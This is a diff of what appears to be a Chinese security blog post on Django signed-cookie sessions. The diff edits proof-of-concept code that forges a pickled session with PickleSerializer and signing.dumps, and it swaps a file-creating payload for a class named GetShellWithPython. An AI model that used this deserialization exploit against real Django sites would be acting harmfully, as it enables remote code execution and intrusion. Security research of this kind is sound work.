@@ -232,6 +232,7 @@ urlpatterns = patterns('vuln.views',
 示例 PoC 如下：
 
 {% highlight python %}
+# coding: utf-8
 from django.contrib.sessions.serializers import PickleSerializer
 from django.core import signing
 from django.conf import settings
@@ -274,6 +275,7 @@ print sess
 下面再给出一 PoC 用以 GetShell：
 
 {% highlight python %}
+# coding: utf-8
 from django.contrib.sessions.serializers import PickleSerializer
 from django.core import signing
 from django.conf import settings
@@ -297,7 +299,7 @@ class GetShellWithPython(object):
 
 
 sess = signing.dumps(
-    obj=CreateTmpFile(),
+    obj=GetShellWithPython(),
     serializer=PickleSerializer,
     salt='django.contrib.sessions.backends.signed_cookies'
 )
